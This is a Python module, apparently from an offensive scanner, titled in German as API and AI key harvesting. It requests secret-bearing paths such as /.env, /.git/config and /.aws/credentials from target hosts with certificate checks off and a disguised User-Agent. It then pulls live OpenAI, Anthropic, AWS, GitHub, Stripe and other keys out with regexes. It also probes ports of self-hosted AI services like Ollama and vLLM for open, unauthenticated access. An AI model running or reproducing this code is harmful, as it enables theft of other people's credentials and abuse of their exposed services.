"""API-/AI-Key-Harvesting und offene AI-Endpunkte."""
from __future__ import annotations
import json
import re

PATHS = ["/.env", "/.env.local", "/.env.prod", "/.env.production", "/config.json",
         "/docker-compose.yml", "/.git/config", "/actuator/env", "/api/config",
         "/.aws/credentials", "/phpinfo.php"]
RE = [
    ("openai", re.compile(r"sk-[A-Za-z0-9_\-]{20,}")),
    ("anthropic", re.compile(r"sk-ant-[A-Za-z0-9_\-]{20,}")),
    ("huggingface", re.compile(r"hf_[A-Za-z0-9]{20,}")),
    ("aws", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("github", re.compile(r"gh[pousr]_[A-Za-z0-9]{20,}")),
    ("google", re.compile(r"AIza[0-9A-Za-z_\-]{30,}")),
    ("slack", re.compile(r"xox[baprs]-[A-Za-z0-9\-]{10,}")),
    ("stripe", re.compile(r"sk_live_[A-Za-z0-9]{20,}")),
]
AI_PORTS = {11434: "ollama", 4000: "litellm", 8000: "vllm", 8080: "localai/openwebui",
            8188: "comfyui", 5678: "n8n", 3000: "flowise/openwebui", 7860: "gradio",
            5001: "openwebui"}


def _sess():
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    s.verify = False
    return s


def harvest(t) -> dict:
    s = _sess()
    found = {}
    for p in PATHS:
        try:
            r = s.get(t.url + p, timeout=4)
        except Exception:
            continue
        if r.status_code != 200 or len(r.text) > 200000:
            continue
        for name, rx in RE:
            m = rx.search(r.text)
            if m and name not in found:
                found[name] = m.group(0)
        if len(found) >= 4:
            break
    return found


def ai_probe(t) -> str | None:
    if t.port not in AI_PORTS:
        return None
    s = _sess()
    checks = {
        11434: ("/api/tags", "models"),
        4000: ("/health/readiness", "status"),
        8000: ("/v1/models", "data"),
        8188: ("/system_stats", "system"),
        5678: ("/rest/settings", "data"),
    }
    path, key = checks.get(t.port, (None, None))
    if not path:
        return None
    try:
        r = s.get(t.url + path, timeout=6, allow_redirects=True)
        if r.status_code == 200 and "weblogin" not in r.url and key in r.text.lower():
            return AI_PORTS[t.port]
    except Exception:
        pass
    return None
